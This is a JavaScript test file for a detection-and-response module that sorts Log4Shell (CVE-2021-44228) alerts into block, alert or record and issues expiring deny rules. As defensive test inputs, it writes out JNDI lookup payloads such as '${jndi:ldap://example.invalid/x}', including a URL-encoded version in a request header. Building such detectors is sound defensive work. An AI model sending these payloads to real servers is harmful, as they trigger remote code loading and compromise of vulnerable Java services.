import assert from 'node:assert/strict';
import { test } from 'node:test';
import { readFile } from 'node:fs/promises';
import { decide } from '../xdr/known-cve/decide.mjs';
import { readAlerts } from '../xdr/known-cve/read-alerts.mjs';
import { buildResponse, applyDenyRules } from '../xdr/known-cve/respond.mjs';
import { decide as baseDecide, RULE_IDS } from '../src/decider.mjs';
const fixture = JSON.parse(await readFile(new URL('../xdr/fixtures/known-cve.json', import.meta.url), 'utf8'));

test('complete payloads, ambiguous hints and normal events remain distinct', () => {
  const rows = fixture.alerts.map(decide);
  assert.ok(rows.slice(0, 8).every(row => row.action === 'block'));
  assert.ok(rows.slice(8, 16).every(row => row.action === 'alert'));
  assert.ok(rows.slice(16).every(row => row.action === 'record'));
  for (const row of rows) {
    assert.deepEqual(Object.keys(row).sort(), ['action', 'confidence', 'reason']);
    assert.equal(row.action, row.confidence >= .85 ? 'block' : row.confidence >= .5 ? 'alert' : 'record');
    assert.ok(!/[\r\n]/.test(row.reason));
  }
});
test('does not block from rule metadata or CVE word alone; handles encoded requests', () => {
  assert.notEqual(decide({ rule: { level: 15, description: 'CVE-2021-44228' }, data: { url: '/docs?q=CVE-2021-44228' } }).action, 'block');
  assert.notEqual(decide({ rule: { level: 15, description: '${jndi:ldap://example.invalid/x}' }, data: {} }).action, 'block');
  assert.equal(decide({ data: { headers: { 'x-probe': '%24%7Bjndi%3Aldap%3A%2F%2Fexample.invalid%2Fx%7D' } } }).action, 'block');
  assert.equal(decide({ data: { url: '${jndi:ldap://' } }).action, 'alert');
  assert.equal(decide(null).action, 'record');
  assert.equal(decide({ rule: { level: 15 }, data: { url: '/health' } }).action, 'record');
});
test('offline classifier has no dependencies or I/O and reasons never echo payloads', async () => {
  const source = await readFile(new URL('../xdr/known-cve/decide.mjs', import.meta.url), 'utf8');
  assert.ok(!/\bimport\s*(?:\(|['"{*])|\b(?:fetch|readFile|writeFile|eval)\s*\(/.test(source));
  assert.ok(!JSON.stringify(decide({ data: { url: 'secret-token ${jndi:ldap://example.invalid/x}' } })).includes('secret-token'));
  assert.equal((await readAlerts()).length, fixture.alerts.length);
});
test('temporary gate preserves existing denies, normal sources, expiry and response contract', async () => {
  const now = Date.now();
  const response = buildResponse(fixture.alerts, now);
  assert.equal(response.rules.length, 8);
  assert.equal(response.notifications.length, 16);
  assert.ok(response.rules.every(row => row.evidenceAlertId && Date.parse(row.expiresAt) === now + 900000));
  const request = { requestId: 'fixture-request', deviceRegistered: true, service: 'notes',
    method: 'GET', route: 'GET /notes/:id', path: '/notes/demo', queryLength: 0, signals: { source: 'none' } };
  const base = await baseDecide(request);
  assert.equal(base.decision, 'allow');
  const args = { request, decision: base, rules: response.rules, trustedTransport: true, now };
  const denied = applyDenyRules({ ...args, verifiedSourceIp: '203.0.113.10' });
  assert.equal(denied.decision, 'deny');
  assert.ok(denied.ruleIds.every(id => RULE_IDS.includes(id)));
  assert.deepEqual(Object.keys(denied).sort(), ['decision','reasonCode','requestId','ruleIds','schema']);
  assert.equal(applyDenyRules({ ...args, verifiedSourceIp: '192.0.2.72' }), base);
  assert.equal(applyDenyRules({ ...args, verifiedSourceIp: '203.0.113.10', now: now + 900000 }), base);
  assert.equal(applyDenyRules({ ...args, verifiedSourceIp: '203.0.113.10', trustedTransport: false }), base);
  const originalDeny = await baseDecide({ ...request, deviceRegistered: false });
  assert.equal(applyDenyRules({ ...args, decision: originalDeny, verifiedSourceIp: '192.0.2.72' }), originalDeny);
});
